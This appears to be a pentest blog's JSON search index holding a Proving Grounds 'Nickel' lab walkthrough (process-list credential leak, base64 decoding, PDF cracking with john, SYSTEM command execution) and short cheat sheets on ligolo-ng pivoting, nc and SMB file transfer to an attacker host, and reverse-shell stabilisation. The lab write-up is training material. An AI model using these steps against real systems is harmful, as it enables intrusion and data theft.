    "description": "Offsec’s proving grounds writeups.\nAccess\nAccess writeup - An attacker achieve initial access by uploading crafted files. After getting the initial shell, other credentials found using kerberoast attack. Finally, An attacker can escalage privilege bu exploiting SeManageVolumePrivilege.\nHeist\nHeist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.\nNickel\nNickel writeup – Windows exploitation walkthrough covering HTTP enumeration, credential discovery via process listing, SSH access, PDF password cracking, and SYSTEM command execution.",
    "tags": [],
    "title": "Proving Grounds",
    "uri": "/writeup/proving-grounds/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Nickel",
    "uri": "/tags/nickel/index.html"
  },
  {
    "breadcrumb": "Home \u003e Writeup \u003e Proving Grounds",
    "content": "Initial foothold Nmap scan PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd 0.9.60 beta | ftp-syst: |_ SYST: UNIX emulated by FileZilla 22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0) | ssh-hostkey: | 3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA) | 256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA) |_ 256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: NICKEL | NetBIOS_Domain_Name: NICKEL | NetBIOS_Computer_Name: NICKEL | DNS_Domain_Name: nickel | DNS_Computer_Name: nickel | Product_Version: 10.0.18362 |_ System_Time: 2026-02-23T09:53:02+00:00 |_ssl-date: 2026-02-23T09:54:08+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=nickel | Not valid before: 2025-12-06T11:11:21 |_Not valid after: 2026-06-07T11:11:21 5040/tcp open unknown 7680/tcp open pando-pub? 8089/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 33333/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC The scan reveals several open ports, including FTP, SSH, SMB, and multiple HTTP services. I will begin by enumerating these services.\nEnumeration WEB Accessing the web service on port 8089 reveals the following home page:\nThe page contains three buttons. Reviewing the source code shows that these links redirect to endpoints on port 33333.\nlist-current-deployments list-running-procs list-active-nodes I attempted to interact with the /list-active-nodes endpoint on port 33333 using curl:\ncurl -XPOST http://192.168.168.99:33333/list-active-nodes -H \"Content-Type:application/www-form-urlencoded\" \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\"http://www.w3.org/TR/html4/strict.dtd\"\u003e \u003cHTML\u003e\u003cHEAD\u003e\u003cTITLE\u003eLength Required\u003c/TITLE\u003e \u003cMETA HTTP-EQUIV=\"Content-Type\" Content=\"text/html; charset=us-ascii\"\u003e\u003c/HEAD\u003e \u003cBODY\u003e\u003ch2\u003eLength Required\u003c/h2\u003e \u003chr\u003e\u003cp\u003eHTTP Error 411. The request must be chunked or have a content length.\u003c/p\u003e \u003c/BODY\u003e\u003c/HTML\u003e The server responded with an HTTP 411 Length Required error. To resolve this, I added a Content-Length header and re-submitted the request:\ncurl -XPOST http://192.168.168.99:33333/list-active-nodes -H \"Content-Type:application/www-form-urlencoded\" -H \"Content-Length:6\" \u003cp\u003eNot Implemented\u003c/p\u003e The request was successful, returning a “Not Implemented” message. I proceeded to test the other endpoints.\ncurl -XPOST http://192.168.168.99:33333/list-running-procs -H \"Content-Type:application/www-form-urlencoded\" -H \"Content-Length:6\" name : System Idle Process commandline : name : System commandline : name : Registry commandline : name : smss.exe commandline : name : csrss.exe commandline : name : wininit.exe commandline : name : csrss.exe commandline : name : winlogon.exe commandline : winlogon.exe name : services.exe commandline : name : lsass.exe commandline : C:\\Windows\\system32\\lsass.exe name : fontdrvhost.exe commandline : \"fontdrvhost.exe\" name : fontdrvhost.exe commandline : \"fontdrvhost.exe\" name : dwm.exe commandline : \"dwm.exe\" name : powershell.exe commandline : powershell.exe -nop -ep bypass C:\\windows\\system32\\ws80.ps1 name : Memory Compression commandline : name : cmd.exe commandline : cmd.exe C:\\windows\\system32\\DevTasks.exe --deploy C:\\work\\dev.yaml --user ariah -p \"Tm93aXNlU2xvb3BUaGVvcnkxMzkK\" --server nickel-dev --protocol ssh name : powershell.exe commandline : powershell.exe -nop -ep bypass C:\\windows\\system32\\ws8089.ps1 name : powershell.exe commandline : powershell.exe -nop -ep bypass C:\\windows\\system32\\ws33333.ps1 name : FileZilla Server.exe commandline : \"C:\\Program Files (x86)\\FileZilla Server\\FileZilla Server.exe\" name : sshd.exe commandline : \"C:\\Program Files\\OpenSSH\\OpenSSH-Win64\\sshd.exe\" name : VGAuthService.exe commandline : \"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\" name : vm3dservice.exe commandline : C:\\Windows\\system32\\vm3dservice.exe name : vmtoolsd.exe commandline : \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" name : vm3dservice.exe commandline : vm3dservice.exe -n name : dllhost.exe commandline : C:\\Windows\\system32\\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235} name : WmiPrvSE.exe commandline : C:\\Windows\\system32\\wbem\\wmiprvse.exe name : msdtc.exe commandline : C:\\Windows\\System32\\msdtc.exe name : LogonUI.exe commandline : \"LogonUI.exe\" /flags:0x2 /state0:0xa3961855 /state1:0x41c64e6d name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : WmiPrvSE.exe commandline : C:\\Windows\\system32\\wbem\\wmiprvse.exe name : MicrosoftEdgeUpdate.exe commandline : \"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /c name : SgrmBroker.exe commandline : name : SearchIndexer.exe commandline : C:\\Windows\\system32\\SearchIndexer.exe /Embedding While reviewing the running processes, I discovered a potential credential for SSH within a command line:\ncmd.exe C:\\windows\\system32\\DevTasks.exe --deploy C:\\work\\dev.yaml --user ariah -p \"Tm93aXNlU2xvb3BUaGVvcnkxMzkK\" --server nickel-dev --protocol ssh\nSSH connection Tm93aXNlU2xvb3BUaGVvcnkxMzkK is base64 decoded password.\necho Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d NowiseSloopTheory139 ssh ariah@targetIP Using these credentials, I successfully established an SSH connection as the user ariah:\nPrivesc Upon checking the FTP directory, I found a PDF file. Since the file was password-protected, I used pdf2john to extract the hash and cracked it with john:\npdf2john infrastructure.pdf \u003e hash john hash --wordlist=/usr/share/wordlists/rockyou.txt ariah4168 The PDF contains a note regarding three sites and mentions a command endpoint.\nThis endpoint allows command execution. I can access this locally via curl from my existing session or set up port forwarding to access it from my Kali machine.\nariah@NICKEL C:\\Users\\ariah\u003ecurl http://127.0.0.1/?whoami \u003c!doctype html\u003e\u003chtml\u003e\u003cbody\u003edev-api started at 2025-12-07T05:47:35 \u003cpre\u003ent authority\\system \u003c/pre\u003e \u003c/body\u003e\u003c/html\u003e Alternatively, using SSH port forwarding:\nariah@NICKEL C:\\Users\u003essh -N -R 80:127.0.0.1:80 kali@IP The output confirms the API is running as nt authority\\system.\nBy sending a URL-encoded command, I can read the proof.txt file or execute a reverse shell payload to gain full system access.",
    "description": "Nickel writeup – Windows exploitation walkthrough covering HTTP enumeration, credential discovery via process listing, SSH access, PDF password cracking, and SYSTEM command execution.",
    "tags": [
      "Port-Forwarding",
      "Nickel",
      "Writeup"
    ],
    "title": "Nickel",
    "uri": "/writeup/proving-grounds/nickel/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Port-Forwarding",
    "uri": "/tags/port-forwarding/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Writeup",
    "uri": "/tags/writeup/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Ligolo",
    "uri": "/tags/ligolo/index.html"
  },
  {
    "breadcrumb": "Home \u003e Posts",
    "content": "ligolo-ng Set a proxy server sudo ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha\nor\nfrom ligolo proxy interface interface_add_route --name evil-cha --route 240.0.0.1/32",
    "description": "ligolo-ng Set a proxy server sudo ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha",
    "tags": [
      "Ligolo"
    ],
    "title": "Pivoting",
    "uri": "/posts/pivoting/index.html"
  },
  {
    "breadcrumb": "Home \u003e Posts",
    "content": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc -q 0 192.168.45.211 1234 \u003c file.txt\nwindows file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc.exe -w 1 192.168.45.211 1234 \u003c file.txt",
    "description": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver",
    "tags": [
      "Smbserver",
      "Nc"
    ],
    "title": "File Transfer",
    "uri": "/posts/file-transfer/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Nc",
    "uri": "/tags/nc/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Smbserver",
    "uri": "/tags/smbserver/index.html"
  },
  {
    "breadcrumb": "Home",
    "content": "Choose a category from the side menu!\nProving Grounds",
    "description": "Choose a category from the side menu!\nProving Grounds",
    "tags": [],
    "title": "Writeup",
    "uri": "/writeup/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Reverseshell",
    "uri": "/tags/reverseshell/index.html"
  },
  {
    "breadcrumb": "Home \u003e Posts",
    "content": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "description": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "tags": [
      "Reverseshell"
    ],
    "title": "Stabilize a reverse shell",
    "uri": "/posts/revshell-upgrade/index.html"
  },
  {
    "breadcrumb": "Home",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Categories",
    "uri": "/categories/index.html"
  }
]
